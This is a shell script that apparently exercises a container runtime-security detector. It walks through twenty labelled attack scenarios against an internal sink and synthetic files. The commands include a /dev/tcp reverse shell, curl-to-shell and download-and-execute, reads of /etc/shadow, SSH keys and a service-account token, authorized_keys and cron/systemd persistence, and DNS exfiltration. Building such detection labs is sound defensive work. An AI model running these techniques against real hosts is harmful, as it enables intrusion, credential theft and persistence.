#!/bin/sh
set -eu

step() {
  printf 'SCENARIO %-24s %s\n' "$1" "$2"
}

until curl -fsS http://sink:8080/payload >/dev/null 2>&1; do
  sleep 0.2
done

mkdir -p /root/.ssh /home/lab/.ssh /etc/cron.d /etc/systemd/system \
  /var/run/secrets/kubernetes.io/serviceaccount /opt/lab /var/log
printf 'synthetic-private-key\n' > /home/lab/.ssh/id_ed25519
printf 'synthetic-service-account-token\n' > /var/run/secrets/kubernetes.io/serviceaccount/token
: > /var/run/docker.sock

step reverse-shell 'bash connects only to the internal lab sink'
lab-parent python3 bash -c 'exec 3<>/dev/tcp/sink/8080; printf "sentinel-lab\n" >&3' || true

step shadow-read 'read container-local placeholder hashes'
cat /etc/shadow >/dev/null

step download-execute 'download safe payload from internal sink and execute it'
curl -fsS http://sink:8080/payload -o /tmp/payload
chmod +x /tmp/payload
/tmp/payload

step authorized-keys 'write only inside ephemeral lab root filesystem'
printf 'ssh-ed25519 SYNTHETIC_SENTINEL_KEY\n' >> /root/.ssh/authorized_keys

step web-shell 'nginx-named parent launches a harmless id command'
lab-parent nginx sh -c 'id >/dev/null'

step container-miner 'execute a marker named like a miner; no mining occurs'
printf '#!/bin/sh\nsleep 0.1\n' > /opt/lab/xmrig
chmod +x /opt/lab/xmrig
/opt/lab/xmrig --url stratum+tcp://sink:8080

step escape-simulation 'execute marker; no namespace or host mount is touched'
printf '#!/bin/sh\nexit 0\n' > /opt/lab/sentinel-escape-probe
chmod +x /opt/lab/sentinel-escape-probe
/opt/lab/sentinel-escape-probe --simulate

step log-deletion 'delete a synthetic container-local log'
printf 'synthetic log\n' > /var/log/sentinel-demo.log
rm -f /var/log/sentinel-demo.log

step cron-persistence 'write an inert comment to container-local cron configuration'
printf '# sentinel lab only\n' > /etc/cron.d/sentinel-demo

step systemd-persistence 'write an inert unit to container-local systemd configuration'
printf '[Unit]\nDescription=sentinel lab only\n' > /etc/systemd/system/sentinel-demo.service

step ssh-key-read 'read a synthetic private key'
cat /home/lab/.ssh/id_ed25519 >/dev/null

step docker-socket 'open a regular file at the socket path; no daemon is mounted'
cat /var/run/docker.sock >/dev/null

step k8s-token 'read a synthetic service-account token'
cat /var/run/secrets/kubernetes.io/serviceaccount/token >/dev/null

step namespace-entry 'print nsenter help; no namespace target is provided'
nsenter --help >/dev/null

step setuid-root 'controlled saved-UID transition inside the lab container'
setuid-helper

step setuid-bit 'set permission only on an inert container-local file'
: > /tmp/helper
chmod u+s /tmp/helper

step k8s-secrets 'execute a kubectl marker that never contacts a cluster'
printf '#!/bin/sh\nexit 0\n' > /usr/local/bin/kubectl
chmod +x /usr/local/bin/kubectl
kubectl get secrets -A

step dns-exfil 'query a TEST-NET address from an internal-only Docker network'
dig @203.0.113.53 chunk.synthetic.invalid +time=1 +tries=1 >/dev/null 2>&1 || true

step curl-pipe-shell 'pipe a fixed local script to a shell'
bash -c 'curl -fsS http://sink:8080/payload | sh'

step temp-execution 'execute a fixed marker from shared memory'
printf '#!/bin/sh\nexit 0\n' > /dev/shm/update-check
chmod +x /dev/shm/update-check
/dev/shm/update-check

printf 'LAB_COMPLETE scenarios=20\n'
